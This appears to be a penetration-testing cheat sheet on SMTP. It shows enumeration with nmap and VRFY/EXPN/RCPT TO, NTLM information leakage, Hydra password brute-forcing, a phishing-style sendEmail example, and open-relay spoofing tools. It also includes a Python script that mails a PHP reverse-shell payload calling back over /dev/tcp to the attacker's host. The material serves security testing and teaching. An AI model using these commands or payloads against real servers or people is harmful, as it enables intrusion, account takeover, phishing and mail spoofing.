---
description: Ports TCP 25,465,587
---

# SMTP

## Theory

SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used for **sending** e-mail. Default ports are 25 (SMTP), 465 (SMTPS), 587 (SMTPS)

## Practice

### Enumerate

{% hint style="info" %}
Using [nmap](https://github.com/nmap/nmap), we can enumerate SMTP servers

```bash
nmap --script smtp-* -p 25,465,587 <target-ip>
```
{% endhint %}

#### Commands

We may attempts to use `EHLO` and `HELP` commands to gather the Extended commands supported by an SMTP server.

{% hint style="info" %}
Commands are not case sensitive.
{% endhint %}

{% tabs %}
{% tab title="Telnet" %}
We may list all supported enhanced functions of a SMTP server as follow

<pre class="language-bash"><code class="lang-bash">root@kali$ telnet example.com 587
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
<strong>>> EHLO all
</strong></code></pre>
{% endtab %}

{% tab title="Nmap" %}
We may use the [smtp-commands.nse](https://nmap.org/nsedoc/scripts/smtp-commands.html) nmap's script

```bash
nmap --script smtp-commands -p 25,465,587 <target-ip>
```
{% endtab %}
{% endtabs %}

#### Usernames

SMTP supports several interesting commands, such as `VRFY`, `EXPN` and `RCPT TO`.&#x20;

* `VRFY` requests asks the server to verify an email address.
* `EXPN` asks the server for the membership of a mailing list.
* `RCPT TO` is used to specify an email recipient but may trigger an "Unknown user" error if the specified user does not exist.

These can often be abused to verify existing users on a mail server, which is useful information during a penetration test.

{% tabs %}
{% tab title="smtp-user-enum" %}
[smtp-user-enum](https://github.com/cytopia/smtp-user-enum) is a python script for user enumeration via VRFY, EXPN and RCPT

```bash
# VRFY - check if the user exists in the SMTP server
smtp-user-enum -M VRFY -u <username> -t <target-ip>
smtp-user-enum -M VRFY -U usernames.txt -t <target-ip>

# RCPT - check if the user is allowed to receive mails in the SMTP server
smtp-user-enum -M RCPT -u <username> -t <target-ip>
smtp-user-enum -M RCPT -U usernames.txt -t <target-ip>

# EXPN - reveal the actual email address
smtp-user-enum -M EXPN -u <username> -t <target-ip>
smtp-user-enum -M EXPN -D <hostname> -U usernames.txt -t <target-ip>
```
{% endtab %}

{% tab title="Nmap" %}
We may use the[ smtp-enum-users.nse](https://nmap.org/nsedoc/scripts/smtp-enum-users.html) nmap's script

```bash
nmap --script smtp-enum-users -p 25,465,587 <target-ip>
```
{% endtab %}

{% tab title="VRFY" %}
We can use the `VRFY` command to enumerate users as follow

<pre class="language-bash"><code class="lang-bash">$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
<strong>VRFY root
</strong>250 Super-User &#x3C;root@myhost>
<strong>VRFY blah
</strong>550 blah... User unknown
</code></pre>
{% endtab %}

{% tab title="EXPN" %}
We can use the `EXPN` command to enumerate users as follow

<pre class="language-bash"><code class="lang-bash">$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
<strong>EXPN test
</strong>550 5.1.1 test... User unknown
<strong>EXPN root
</strong>250 2.1.5 &#x3C;ed.williams@myhost>
<strong>EXPN sshd
</strong>250 2.1.5 sshd privsep &#x3C;sshd@mail2>
</code></pre>
{% endtab %}

{% tab title="RCPT TO" %}
We can use the `RCPT TO` command to enumerate users as follow

<pre class="language-bash"><code class="lang-bash">$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
<strong>RCPT TO:test
</strong>550 5.1.1 test... User unknown
<strong>RCPT TO:admin
</strong>550 5.1.1 admin... User unknown
<strong>RCPT TO:ed
</strong>250 2.1.5 ed... Recipient ok
</code></pre>
{% endtab %}
{% endtabs %}

#### NTLM Auth - Information disclosure

If the server supports NTLM auth (Windows) you can obtain sensitive info (versions). More information [here](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).

{% tabs %}
{% tab title="Telnet" %}
We may leak sensitive information as follow

<pre class="language-bash"><code class="lang-bash">root@kali$ telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
<strong>>> AUTH NTLM 334 
</strong>NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
</code></pre>
{% endtab %}

{% tab title="Nmap" %}
We may use the [smtp-ntlm-info.nse](https://nmap.org/nsedoc/scripts/smtp-ntlm-info.html) nmap's script

```bash
nmap --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com -p 25,465,587 <target-ip>
```
{% endtab %}
{% endtabs %}

### Connect

{% tabs %}
{% tab title="SMTP" %}
We may use following command to connect to a SMTP

```bash
# Netcat
nc <target-ip> 25

# Telnet
telnet <target-ip> 25
```
{% endtab %}

{% tab title="SMTPS" %}
We may use following command to connect to a SMTP server using TLS

```bash
# port 25
openssl s_client -starttls smtp -connect <target-ip>:25
# Port 465
openssl s_client -crlf -connect <target-ip>:465
# Port 587
openssl s_client -starttls smtp -crlf -connect <target-ip>:587
```
{% endtab %}
{% endtabs %}

### Authentication Bruteforce

{% tabs %}
{% tab title="Hydra" %}
We may use hydra to bruteforce SMTP accounts on the server

```bash
# Port 25
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V

# Port 587 for SMTP with SSL
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
```
{% endtab %}

{% tab title="Nmap" %}
We may use the [smtp-brute.nse](https://nmap.org/nsedoc/scripts/smtp-brute.html) nmap's script

```bash
nmap --script smtp-brute -p 25,465,587 <target-ip>
```
{% endtab %}
{% endtabs %}

### Send E-mail

{% tabs %}
{% tab title="Swaks" %}
[**swaks**](https://github.com/jetmore/swaks) is a swiss army knife for SMTP and can be used to send  emails from external domain

```bash
# Basic usage
swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --header "Subject: test" --body "hello"

# Mass email
swaks --to $(cat emails | tr '\n' ',' | less) --from local-user@<local-ip> --server mail.example.com --header "Subject: test" --body "hello"
```
{% endtab %}

{% tab title="sendEmail" %}
[sendEmail](https://github.com/mogaal/sendemail) is a lightweight, completely command line based, SMTP email agent.

```bash
# Send with email attahement
sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s <SMTP_SRV_IP> -u "Important Upgrade Instructions" -a /tmp/BestComputers-UpgradeInstructions.pdf
```
{% endtab %}

{% tab title="Python" %}
We may use following python script to send emails

```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
{% endtab %}
{% endtabs %}

### Mail Spoofing

**Open Relay**

To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a **relay server that the recipient trusts**. Often, administrators **haven't overviewed** of which **IP** ranges they have to **allow**. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they **allow all IP addresses** not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers:

```
mynetworks = 0.0.0.0/0
```

{% tabs %}
{% tab title="Nmap" %}
We may use the [smtp-open-relay](https://nmap.org/nsedoc/scripts/smtp-open-relay.html) script to enumerate if a SMTP server is vulnerable to mail relaying.

```bash
nmap -p25 --script smtp-open-relay <IP> -v
```
{% endtab %}
{% endtabs %}

#### Tools

{% tabs %}
{% tab title="MagicSpoofing" %}
[MagicSpoofing](https://github.com/magichk/magicspoofing) is a python script that checks & test SPF/DMARC DNS records an tries to spoof a domain with a open relay mail system.

```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com

# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% endtab %}
{% endtabs %}



## Ressources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp" %}

{% embed url="https://exploit-notes.hdks.org/exploit/email/smtp-pentesting/" %}
